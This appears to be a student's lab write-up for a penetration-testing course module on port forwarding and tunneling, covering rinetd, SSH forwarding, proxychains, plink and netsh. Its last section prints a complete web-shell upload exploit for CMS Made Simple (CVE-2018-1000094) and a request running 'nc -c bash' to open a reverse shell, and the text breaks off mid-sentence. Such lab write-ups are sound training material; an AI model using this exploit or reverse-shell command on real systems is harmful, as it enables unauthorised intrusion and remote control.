# 20.1.2 Port Forwarding
**1.  Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

In preparation for the following exercise we simply need to ssh into our Debian machine and run the required script as root.



**2.  Attempt to replicate the port-forwarding technique covered in the above scenario.**

once our systems are prepared for the exercise we begin by checking the connectivity of both machines. Doing so will show us that although our local, Kali machine is able to reach the internet our Debian lab client will have no connection. 
Local Kali Machine
![[Pasted image 20220727202728.png]]

Debian Lab Client
![[Pasted image 20220727202848.png]]

In order to route Google's traffic to our Debian machine we will be utilizing RINETD, once installed we can navigate to the config folder found at /etc/rinetd.conf. We make the following edit to the configuration fire:
![[Pasted image 20220727203726.png]]
This will forward all traffic our Kali machine receives on port 80 to the Google IP and port and specified earlier.

Upon restarting the service we can see that we are now listening on port 80.
![[Pasted image 20220727203949.png]]

Now to verify our connection, let's switch back to our Debian lab machine and attempt to connect to our listening Kali machine.
![[Pasted image 20220727204428.png]]
And we see we get a 200 OK from google, redirected through our Kali machine.

# 20.2.2 SSH Local Port Forwarding
**1.  Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

As we did previously, we simply need to run the requested script.

**2.  Run the ssh_local_port_forwarding.sh script from /root/port_forwarding_and_tunneling/ as root.**

In addition to the clear_rules.sh script we must also run the ssh_local_port_forwarding.sh script in the same directory.

**3.  Take note of the Linux client and Windows Server 2016 IP addresses shown in the Student Control Panel.**

Running the "ip a" command on the Linux client we see two IP addresses running under two separate network interfaces. This signifies that the machine is connected to two separate networks.
![[Pasted image 20220728154901.png]]
Running "ipconfig" on our Windows machine shows a similar setup.
![[Pasted image 20220728155012.png]]

**4.  Attempt to replicate the smbclient enumeration covered in the above scenario.**

To establish a connection to the Windows client running on the internal network we will need to leverage a tunnel from our Kali machine through the compromised Linux machine, arriving at the Windows server machine. We can do this via the following SSH command:
`sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128`

This utilizes the following SSH syntax:
`ssh -N -L [bind_address:]port:host:hostport [username@address]`

After adjusting our smb.conf file, setting the minimum SMB version to SMBv2 we can restart the service and attempt to enumerate the shares (note we are using "localhost" in the command due to the tunnel).
![[Pasted image 20220728161021.png]]

# 20.2.4 SSH Remote Port Forwarding

**1. Connect to your dedicated Linux lab client via SSH and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

As with previous sections, simply navigate to the proper directory and run the requested scripts as root.

**2. Close any SSH connections to your dedicated Linux lab client and then connect as the student account using rdesktop and run the ssh_remote_port_forward.sh script from /root/port_forwarding_and_tunneling/ as root.**

For this exercise we need to now run the next script while connected via rdesktop. This is to ensure SSH rules are created correctly.
![[Pasted image 20220728174816.png]]

**3. Attempt to replicate the SSH remote port forwarding covered in the above scenario and ensure that you can scan and interact with the MySQL service.**

As we are unable to access the Debian client from our Kali machine via SSH we must initiate the connection on the Debian machine, forwarding the remote port to our local Kali machine. To do this we can use a similar command as we used previously, replacing a few of the variables and flags.

The following command, run on our Debian client should forward the proper ports to our Kali machine:
`ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4`
(note: ensure ssh service is currently running on local machine)
![[Pasted image 20220728175357.png]]

And we now have access to MYSQL being run on the remote Debian client.
![[Pasted image 20220728175558.png]]

# 20.2.6 SSH Dynamic Port Forwarding

**1.  Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.**

As with previous sections, simply navigate to the proper directory and run the requested scripts as root.

**2.  Take note of the Linux client and Windows Server 2016 IP addresses.**

We can see from our lab control panel the following IPs:
Debian: 192.168.197.44
Windows 2016 Server: 172.16.197.5

**3.  Create a SOCKS4 proxy on your Kali machine, tunneling through the Linux target.**

We can create the proxy using the following command:
`sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128`

**4.  Perform a successful nmap scan against the Windows Server 2016 machine through the proxy.**

First, we then need to setup proxychains to run standard network applications through our created proxy. We do this by simply appended `socks4 127.0.0.1 8080` to our proxychains4.conf file.

Now that proxychains is setup we can use it by adding "proxychains" a the start of our commands. For the requested nmap scan the following command can be used:
`sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110`
![[Pasted image 20220728184302.png]]

**5.  Perform an nmap SYN scan through the tunnel. Does it work? Are the results accurate?**

By altering the previous command from a TCP connect scan (-sT) to a SYN scan (-sS) we get the following results.
![[Pasted image 20220728185447.png]]
Note that all the ports are marked as filtered, indicated an unsuccessful scan. This is due to the lack of a payload for proxychains to forward.
# 20.3.1 PLINK.exe

**1.  Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.**

We can obtain a reverse shell by utilizing our initial buffer overflow payload we crafted in section 11.
![[syncbreeze_buffer_shell.png]]

**2.  Use plink.exe to establish a remote port forward to the MySQL service on your Windows 10 client.**
As we are unable to reach the MYSQL service from our Kali machine we can utiilize the plink.exe application to forward us the port. We do this by executing the plink.exe binary on the Windows machine with the following command:
`plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`

This will execute plink and instruct it to ssh into our Kali machine with the credentials "kali:ilak" and remote port forward the address/port of our Kali box (10.11.0.4:1234) to the MYSQL port running on localhost (127.0.0.1:3306) We can also pipe "cmd.exe /c echo y" to this command in order provide an answer to the "Store key in chase" question which will be prompted the first time the tool runs.

`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 192.168.119.197:9001:127.0.0.1:3306 192.168.119.197


**3.  Scan the MySQL port via the remote port forward.**

Once plink.exe has been executed and the tunnel has been created we can then scan localhost with the port specified in our command and we will be able to enumerate the remote service.

![[plink_nmap.png]]

# 20.4.1 NETSH
**1.  Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.**

As with the previous section, simply need to setup a listener and run our buffer overflow python script from section 12.

**2.  Using the SYSTEM shell, attempt to replicate the port forwarding example using netsh.**

We first confirm that the IP Helper service is running using the following command:
`net start iphlpsvc`
And we can check ipv6 is enable via a powershell command:
`powershell Get-NetAdapterBinding -ComponentID ms_tcpip6`

![[ps_ipv6_status.png]]

From here, we just need to issue the following netsh command to setup the port forward:
`netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.197.10 connectport=445 connectaddress=172.16.197.5

This command will add an IPV4 to IPV4 proxy which is listening on 192.168.197.10:445. This proxy will then forward traffic to 172.16.197.5:445, the address of the Windows 2016 server.

After issuing this command we can double check the local port to ensure it is listening:
![[netsh_port_check.png]]

Finally, we need to change the firewall in order to allow incoming connections. This can be done with the following command:
`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.197.10 localport=4455 action=allow`

We should now be able to access the Windows 2016 SMB share from our Kali machine. We can test this using SMBClient (note the 'port' flag matching the port we setup on the Windows machine).
![[smb_success.png]]

We can then take this a step further and mount this drive directly on our Kali machine.
![[smb_mounted.png]]


# 20.5.1 HTTPTunneling Through Deep Packet Inspection
**1.  Connect to your dedicated Linux lab client as the student account using rdesktop and run the http_tunneling.sh script from /root/port_forwarding_and_tunneling/ as root.**

Simply navigate to the proper directory and run the http_tunneling.sh script as root.

**2.  Start the apache2 service and exploit the vulnerable web application hosted on port 443 (covered in a previous module) in order to get a reverse HTTP shell.**

Once the apache service is started we can run the following exploit (from an earlier section) in order to gain a reverse shell on the Debian server.

```python
# Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution
# Date: 3rd of July, 2018
# Exploit Author: Mustafa Hasan (@strukt93)
# Vendor Homepage: http://www.cmsmadesimple.org/
# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/
# Version: 2.2.5
# CVE: CVE-2018-1000094

import requests
import base64

base_url = "https://192.168.197.44/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
username = "admin"
password = "HUYfaw763"

csrf_param = "_sk_"
txt_filename = 'cmsmsrce.txt'
php_filename = 'command.php'
payload = "<?php system($_GET['cmd']);?>"


def parse_csrf_token(location):
    print "[+] String that is being split: " + location
    return location.split(csrf_param + "=")[1]

def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        print "[+] Authenticated successfully with the supplied credentials"
        return response.cookies, parse_csrf_token(response.headers['Location'])
    print "[-] Authentication failed"
    return None, None

def upload_txt(cookies, csrf_token):
    mact = "FileManager,m1_,upload,0"
    page = "/moduleinterface.php"
    url = base_url + page
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "disable_buffer": 1
    }
    txt = {
        'm1_files[]': (txt_filename, payload)
    }
    print "[*] Attempting to upload {}...".format(txt_filename)
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
    status_code = response.status_code
    if status_code == 200:
        print "[+] Successfully uploaded {}".format(txt_filename)
        return True
    print "[-] An error occurred while uploading {}".format(txt_filename)
    return None

def copy_to_php(cookies, csrf_token):
    mact = "FileManager,m1_,fileaction,0"
    page = "/moduleinterface.php"
    url = base_url + page
    b64 = base64.b64encode(txt_filename)
    serialized = 'a:1:{{i:0;s:{}:"{}";}}'.format(len(b64), b64)
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "m1_fileactioncopy": "",
        "m1_path": upload_dir,
        "m1_selall": serialized,
        "m1_destdir": "/",
        "m1_destname": php_filename,
        "m1_submit": "Copy"
    }
    print "[*] Attempting to copy {} to {}...".format(txt_filename, php_filename)
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    status_code = response.status_code
    if status_code == 302:
        if response.headers['Location'].endswith('copysuccess'):
            print "[+] File copied successfully"
            return True
    print "[-] An error occurred while copying, maybe {} already exists".format(php_filename)
    return None    

def quit():
    print "[-] Exploit failed"
    exit()

def run():
    cookies,csrf_token = authenticate()
    if not cookies:
        quit()
    if not upload_txt(cookies, csrf_token):
        quit()
    if not copy_to_php(cookies, csrf_token):
        quit()
    print "[+] Exploit succeeded, shell can be found at: {}".format(upload_url + '/' + php_filename)

run()
            
```

After running this exploit we should have created the /uploads/command.php endpoint which allows us to execute code on the server. We can use the following request to gain a reverse shell:
`https://192.168.197.44/uploads/command.php?cmd=nc%20-c%20bash%20192.168.119.197%209000`



**3.  Replicate the scenario demonstrated above using your dedicated clients.**

Once we have a reverse shell 